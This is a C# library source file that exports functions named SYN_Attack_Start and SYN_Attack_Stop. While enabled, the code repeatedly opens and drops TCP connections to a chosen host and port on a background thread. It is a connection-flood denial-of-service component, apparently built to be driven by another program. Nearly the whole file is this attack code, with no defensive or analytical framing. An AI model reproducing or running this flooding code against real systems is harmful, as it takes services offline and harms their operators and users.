using System;
using System.Collections.Generic;
using System.Linq;
using System.Net.Sockets;
using System.Runtime.InteropServices;
using System.Text;
using System.Threading;
using System.Threading.Tasks;

namespace CoreLibrary
{
    public class Core
    {

        public static bool SYN_Active { get; set; }


        [DllExport]
        public static void SYN_Attack_Stop()
        {
            SYN_Active = false;
        }

        [DllExport]
         public static void SYN_Attack_Start([MarshalAs(UnmanagedType.LPWStr)]String host, int port, int timeout)
        {
            ThreadPool.QueueUserWorkItem((e) =>
            {           
                while (SYN_Active)
                {
                            Socket synSocket = new Socket(AddressFamily.InterNetwork, SocketType.Stream, ProtocolType.Tcp);
                            synSocket.Blocking = false;
                            try
                            {
                                synSocket.BeginConnect(host, port, new AsyncCallback(onConnect), null);
                            }
                            catch
                            {

                            }

                            Thread.Sleep(100);

                            try
                            {
                                if (synSocket.Connected)
                                {
                                    synSocket.Disconnect(false);
                                }
                                synSocket.Close();
                                synSocket = null;
                            }
                            catch 
                            {
                        
                            }
                            Thread.Sleep(timeout);

               }

                if (SYN_Active)
                    SYN_Active = false;

            });
        }

        static void onConnect(IAsyncResult ar)
        {
        }


        /* [DllExport]
         [return: MarshalAs(UnmanagedType.LPWStr)]
         public static string TEST([MarshalAs(UnmanagedType.LPWStr)]String host, int port, int timeout)
         {
             return String.Format("HOST = {0} and PORT = {1} and TIMEOUT = {2}", host, port, timeout.ToString());
         }*/
    }
}
